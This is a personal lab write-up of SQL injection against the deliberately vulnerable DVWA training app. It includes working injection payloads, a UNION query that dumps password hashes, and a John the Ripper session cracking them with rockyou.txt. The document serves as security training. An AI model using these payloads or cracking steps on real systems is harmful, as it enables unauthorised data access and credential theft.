# Lab Writeup #07 — SQL Injection on DVWA

**Date:** 31/03/2026
**Target:** 192.168.56.102 (DVWA — Security: Low)
**Attacker:** 192.168.56.101 (Kali Linux)

## TL;DR
Exploited SQL injection vulnerability in DVWA to dump all user password hashes,
then cracked all 4 unique hashes using John the Ripper and rockyou.txt in under
1 second.

## What is SQL Injection?
SQL injection occurs when user input is inserted directly into a database query
without sanitisation. An attacker can manipulate the query logic to return
unintended data or bypass authentication.

Normal query:
SELECT * FROM users WHERE id='1'

Injected query:
SELECT * FROM users WHERE id='1' OR '1'='1'

'1'='1' is always true, so the OR condition returns every row in the table.

## Attack Steps

### Step 1 — Test for vulnerability
Input: 1'
Result: White screen / query error
Conclusion: Input goes directly into SQL query — vulnerable

### Step 2 — Dump all users
Input: 1' OR '1'='1
Result: All 5 users returned
Explanation: OR '1'='1' makes condition true for every row

### Step 3 — Extract password hashes (UNION injection)
Input: 1' UNION SELECT user, password FROM users#
Result: All usernames and MD5 hashes returned

Hashes extracted:
- admin: 5f4dcc3b5aa765d61d8327deb882cf99
- gordonb: e99a18c428cb38d5f260853678922e03
- 1337: 8d3533d75ae2c3966d7e0d4fcc69216b
- pablo: 0d107d09f5bbe40cade3de5c71e9e9b7
- smithy: 5f4dcc3b5aa765d61d8327deb882cf99

### Step 4 — Crack hashes with John the Ripper
```bash
cat > ~/dvwa_hashes.txt << EOF
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
EOF
john ~/dvwa_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5

Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (admin)
abc123           (gordonb)
letmein          (pablo)
charley          (1337)
4g 0:00:00:00 DONE (2026-03-31 07:01) 133.3g/s 96000p/s 96000c/s 128000C/s
Session completed.
```

## Why This Is Critical
- Full account takeover for every user
- MD5 is not suitable for password storage — too fast to crack
- All passwords found in rockyou.txt — weak password policy
- admin and smithy shared the same password

## What UNION Does
UNION joins two SELECT statements. The injected query runs alongside the
original, appending results from a completely different table (users) into
the response. The # character comments out the rest of the original query.

## MITRE ATT&CK
- T1190 — Exploit Public-Facing Application
- T1552.001 — Credentials in Files (extracted from database)

## Next Steps
- Try SQL injection with security set to Medium — observe the difference
- Use SQLMap to automate the same attack
- Learn about parameterised queries — the fix for SQL injection